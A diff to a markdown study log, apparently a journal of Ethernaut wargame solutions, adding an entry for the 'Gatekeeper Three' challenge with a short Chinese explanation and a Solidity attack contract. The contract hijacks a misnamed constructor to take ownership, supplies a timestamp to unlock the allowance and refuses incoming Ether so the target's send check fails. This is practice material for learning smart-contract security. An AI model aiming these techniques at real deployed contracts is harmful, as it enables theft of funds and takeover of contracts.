@@ -313,4 +313,39 @@ contract AttackGoodSamaritan is INotifyable {
 }
 ```
 
+
+### 2024.09.14
+#### Ethernaut - Gatekeeper Three
+满足题目的三个 modifier，就可以成为参赛者。
+实例地址：0x784872141affcfD443a6f43093Ed81B0BB6d6D04
+```
+contract AttackGatekeeperThree {
+    address public gateAddr;
+
+    constructor(address addr) {
+        gateAddr = addr;
+    }
+
+    error Error1();
+
+    function setConstruct0r() public {
+        GatekeeperThree(payable (gateAddr)).construct0r();
+    }
+
+    function getAllowance() public {
+        uint256 t = block.timestamp;
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+    }
+
+    function setEnter() public {
+        GatekeeperThree(payable (gateAddr)).enter();
+    }
+
+    receive() external payable {
+        revert Error1();
+    }
+}
+```
+
 <!-- Content_END -->
